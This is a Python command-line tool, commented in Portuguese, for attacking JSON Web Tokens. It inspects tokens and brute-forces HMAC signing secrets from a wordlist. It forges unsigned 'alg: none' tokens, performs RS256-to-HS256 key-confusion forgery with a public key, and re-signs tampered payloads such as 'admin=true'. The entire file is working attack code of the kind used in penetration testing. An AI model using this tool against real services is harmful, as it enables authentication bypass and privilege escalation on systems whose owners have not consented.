import jwt
import json
import base64
import argparse
import concurrent.futures
from jwt.exceptions import InvalidSignatureError, DecodeError

# Função para limpar e decodificar base64 do JWT
def decode_jwt_part(data):
    padding = len(data) % 4
    if padding:
        data += '=' * (4 - padding)
    return base64.urlsafe_b64decode(data).decode('utf-8', errors='ignore')

# Função para codificar dados para o formato JWT
def encode_jwt_part(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

# Mostra o que tem dentro do token sem validar assinatura
def inspect_token(token):
    try:
        chunks = token.split('.')
        if len(chunks) != 3:
            print("[-] Token inválido!")
            return None
        
        head = json.loads(decode_jwt_part(chunks[0]))
        body = json.loads(decode_jwt_part(chunks[1]))
        
        print(f"\n--- INFO DO TOKEN ---")
        print(f"Alg: {head.get('alg')} | Typ: {head.get('typ')}")
        print(f"Payload:\n{json.dumps(body, indent=2)}")
        return head, body
    except Exception as e:
        print(f"[-] Erro ao ler token: {e}")
        return None

# Testa uma única chave (usada pelo multithreading)
def try_key(token, key, alg):
    try:
        jwt.decode(token, key, algorithms=[alg])
        return key
    except:
        return None

# Brute force usando várias threads para ser mais rápido
def crack_jwt(token, path, alg='HS256'):
    print(f"[*] Tentando quebrar chave {alg}...")
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist = [line.strip() for line in f]
        
        with concurrent.futures.ThreadPoolExecutor() as pool:
            tasks = [pool.submit(try_key, token, k, alg) for k in wordlist]
            for t in concurrent.futures.as_completed(tasks):
                res = t.result()
                if res:
                    print(f"\n\n[!] SUCESSO! Chave: {res}")
                    return res
        print("\n[-] Nada encontrado na lista.")
    except FileNotFoundError:
        print("[-] Arquivo de wordlist não existe.")

# Ataque clássico de mudar o algoritmo para 'none'
def exploit_none(token):
    parts = token.split('.')
    header = {"alg": "none", "typ": "JWT"}
    return f"{encode_jwt_part(json.dumps(header))}.{parts[1]}."

# Tenta usar a chave pública como se fosse a secreta do HS256
def exploit_confusion(token, pub_key_file):
    print("[*] Testando Key Confusion (RS256 -> HS256)...")
    try:
        with open(pub_key_file, 'r') as f:
            key_data = f.read()
        
        parts = token.split('.')
        payload = json.loads(decode_jwt_part(parts[1]))
        
        # Assina com HS256 usando a chave pública
        res = jwt.encode(payload, key_data, algorithm='HS256')
        print(f"[+] Token gerado:\n{res}")
    except Exception as e:
        print(f"[-] Falha: {e}")

# Altera valores no payload e gera um novo token
def modify_jwt(token, secret, alg, changes):
    try:
        parts = token.split('.')
        payload = json.loads(decode_jwt_part(parts[1]))
        
        for item in changes:
            k, v = item.split('=')
            # Converte tipos básicos automaticamente
            if v.lower() == 'true': v = True
            elif v.lower() == 'false': v = False
            elif v.isdigit(): v = int(v)
            payload[k] = v
            
        final = jwt.encode(payload, secret, algorithm=alg)
        print(f"\n[+] Novo Token:\n{final}")
    except Exception as e:
        print(f"[-] Erro na forja: {e}")

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="JWT Tool")
    p.add_argument('-t', '--token', help='Token alvo')
    p.add_argument('-s', '--show', action='store_true', help='Ver conteúdo')
    p.add_argument('-w', '--wordlist', help='Caminho da wordlist')
    p.add_argument('-k', '--key', help='Chave secreta')
    p.add_argument('-a', '--alg', default='HS256', help='Algoritmo')
    p.add_argument('-m', '--mod', nargs='+', help='Ex: admin=true')
    p.add_argument('--none', action='store_true', help='Ataque None')
    p.add_argument('--conf', help='Caminho da chave pública')

    args = p.parse_args()

    if not args.token:
        p.print_help()
        exit()

    if args.show:
        inspect_token(args.token)

    if args.wordlist:
        crack_jwt(args.token, args.wordlist, args.alg)

    if args.none:
        print(f"\n[+] Token None:\n{exploit_none(args.token)}")

    if args.conf:
        exploit_confusion(args.token, args.conf)

    if args.key and args.mod:
        modify_jwt(args.token, args.key, args.alg, args.mod)
